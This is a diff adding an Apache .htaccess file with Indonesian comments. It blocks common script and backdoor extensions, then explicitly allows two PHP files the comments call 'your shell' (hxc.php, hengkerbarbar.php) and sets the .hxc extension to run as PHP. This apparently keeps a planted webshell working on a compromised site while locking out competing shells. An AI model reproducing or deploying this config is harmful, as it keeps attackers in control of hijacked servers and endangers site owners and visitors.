@@ -1,0 +1,36 @@
+# Blokir semua file script/backdoor umum
+<FilesMatch "\.(php[0-9]?|phtml|phar|inc|cgi|pl|py|exe|jsp|aspx?|dll|scr|com|bat|sh|bash|cmd|js|jar|vbs|vb|wsf|msi)$">
+    Order allow,deny
+    Deny from all
+</FilesMatch>
+
+# Blokir file dengan ekstensi ganda tipuan (php.jpg, php.docx, dll)
+<FilesMatch "\.(php|php[0-9]?|phtml)\.(jpg|jpeg|png|gif|pdf|doc|docx|xls|xlsx|txt|zip)$">
+    Order allow,deny
+    Deny from all
+</FilesMatch>
+
+# (Opsional) Izinkan hanya file publik tertentu
+<FilesMatch "\.(jpg|jpeg|png|webp|pdf|doc|docx|xls|xlsx|txt|css|js|html|zip)$">
+    Order allow,deny
+    Allow from all
+</FilesMatch>
+
+# (Opsional) Izinkan file PHP tertentu (misalnya shell kamu)
+<FilesMatch "^(hxc.php|hengkerbarbar.php)$">
+    Order allow,deny
+    Allow from all
+</FilesMatch>
+
+# Aktifkan rewrite engine (jika pakai routing/index.php)
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
+
+# Jalankan .hxc sebagai PHP
+AddType application/x-httpd-php .hxc
